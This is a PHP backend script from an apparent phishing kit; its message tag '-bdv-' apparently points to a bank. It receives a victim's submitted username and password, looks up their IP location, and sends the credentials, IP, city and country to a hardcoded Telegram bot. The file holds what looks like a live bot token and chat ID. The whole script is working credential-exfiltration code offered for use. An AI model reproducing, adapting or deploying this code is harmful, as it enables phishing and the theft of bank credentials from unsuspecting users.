<?php
// backend/sendToken.php

// Asegúrate de que el token y el chat_id estén configurados correctamente
$token = '7508938063:AAHW4VFXD-nNPdq2voTPpBubz-vfp-VJFzo';  // Usa tu propio token de bot
$chatId = '5720253440';  // Usa tu propio chat_id

// Obtener los datos enviados desde el frontend
$data = json_decode(file_get_contents('php://input'), true);

// Asegúrate de que los datos estén presentes
if (isset($data['usr']) && isset($data['pw'])) {
    $usr = $data['usr'];
    $pw = $data['pw'];

    // Obtener la dirección IP del cliente
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Si la IP es pasada a través de un proxy, usamos la primera IP en la lista
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        $ip = explode(',', $ip)[0]; // Tomar la primera IP en la lista
    } else {
        $ip = $_SERVER['REMOTE_ADDR']; // Usar la IP directamente si no hay proxy
    }

    // Obtener información de la IP usando la API de ipinfo.io
    $ip_info_url = "https://ipinfo.io/{$ip}/json";
    $ip_info = @json_decode(file_get_contents($ip_info_url));

    if ($ip_info === null) {
        // Manejo de error si la API no respondió correctamente
        error_log("No se pudo obtener la información de la IP.");
        $ciudad = 'Desconocida';
        $pais = 'Desconocido';
    } else {
        // Extraer la ciudad y el país si la API respondió correctamente
        $ciudad = isset($ip_info->city) ? $ip_info->city : 'Desconocida';
        $pais = isset($ip_info->country) ? $ip_info->country : 'Desconocido';
    }

    // Crear el mensaje a enviar
    $message = "-bdv-\n --Usr.: $usr \n Pw: $pw\n" .
               "IP: $ip\nCiudad: $ciudad\nPaís: $pais";

    // URL de la API de Telegram
    $url = "https://api.telegram.org/bot$token/sendMessage";

    // Los parámetros de la solicitud
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'html'
    ];

    // Inicializar cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params)); // Use http_build_query para enviar los datos correctamente
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Añadido: Timeout para evitar que se quede esperando mucho tiempo

    // Ejecutar la solicitud
    $response = curl_exec($ch);

    // Verificar si hubo errores en la solicitud cURL
    if (curl_errno($ch)) {
        echo json_encode(['status' => 'error', 'message' => curl_error($ch)]);
    } else {
        // Decodificar la respuesta de Telegram
        $responseData = json_decode($response, true);

        // Verificar si la respuesta indica éxito o error
        if ($responseData['ok']) {
            echo json_encode(['status' => 'success', 'message' => 'Mensaje enviado con éxito']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Error en la API de Telegram: ' . $responseData['description']]);
        }
    }

    // Cerrar cURL
    curl_close($ch);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Datos insuficientes']);
}
?>
